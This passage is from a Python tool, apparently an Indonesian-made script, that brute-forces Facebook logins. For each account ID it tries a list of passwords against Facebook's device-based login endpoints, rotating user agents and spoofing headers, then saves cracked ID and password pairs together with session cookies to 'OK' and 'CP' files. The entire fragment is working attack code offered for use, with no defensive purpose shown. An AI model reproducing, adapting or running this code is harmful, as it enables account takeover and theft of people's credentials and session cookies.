&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				ketik(tabel(f"[bold yellow]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}",title=f"[bold red][ 💀[bold yellow]REDUP ABANGKUH[bold red]💀 ]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				ketik(tabel(f"[bold green]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}\nCOOKIE : {kuki}",title=f"[bold purple][ 🔥[bold green]MENYALA ABANGKUH[bold purple]🔥 ]",style=f"bold purple"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---[ VALIDAT ALVINO UPDATE ]---#
def kyukpa(idf,pwz):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	gaya = rc([f"{m}LXYZZ",f"{k}LXYZZ",f"{h}LXYZZ",f"{B}LXYZZ",f"{u}LXYZZ"])
	prog.update(des,description=f"{gaya}[bold purple] [[bold green]{loop}/{len(id)}[bold purple]] [[bold green]SUCCES : {ok}[bold purple]][/] [bold purple][[bold yellow]CP : [bold yellow]{cp}[bold purple]][/]")
	prog.advance(des)
	for pw in pwz:
		try:
			ua = rc(ugen)
			ses.headers.update({'Host': 'free.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid": idf,"next": "https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow": "login_no_pin","pass": pw}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=360x456'
			heade={'Host': 'free.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not;A=Brand";v="120", "Chromium";v="120"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				ketik(tabel(f"[bold yellow]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}",title=f"[bold red][ 💀[bold yellow]REDUP ABANGKUH[bold red]💀 ]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				ketik(tabel(f"[bold green]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}\nCOOKIE : {kuki}",title=f"[bold purple][ 🔥[bold green]MENYALA ABANGKUH[bold purple]🔥 ]",style=f"bold purple"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---[ VALIDAT FOXDEV UPDATE ]---#
def hosinsul(idf,pwz,awal):
	global loop,ok,cp
	jam_tayang = str(datetime.datetime.now()-awal).split('.')[0]
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	gaya = rc([f"{m}LXYZZ",f"{k}LXYZZ",f"{h}LXYZZ",f"{B}LXYZZ",f"{u}LXYZZ"])
	prog.update(des,description=f"{gaya}[bold purple] [[bold green]{loop}/{len(id)}[bold purple]] [[bold green]SUCCES : {ok}[bold purple]][/] [bold purple][[bold yellow]CP : [bold yellow]{cp}[bold purple]][/]")
	prog.advance(des)
	for pw in pwz:
		try:
			ua = random.choice(ugen)
			scupv = ['"8.0.0"','"9.0.0"','"10.0.0"','"11.0.0"','"12.0.0"','"13.0.0"']
			bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": idf,
				"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified",
				"flow": "login_no_pin",
				"encpass": f"#PWD_BROWSER:0:{str(DeltaTimer()).split('.')[0]}:{pw}",
			}
			hider = {'Host': 'free.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data,headers=hider,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp+=1
				ketik(tabel(f"[bold yellow]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}",title=f"[bold red][ 💀[bold yellow]REDUP ABANGKUH[bold red]💀 ]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				ketik(tabel(f"[bold green]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}\nCOOKIE : {kuki}",title=f"[bold purple][ 🔥[bold green]MENYALA ABANGKUH[bold purple]🔥 ]",style=f"bold purple"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----[ SYSTEM CONTROL ]---#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	menu()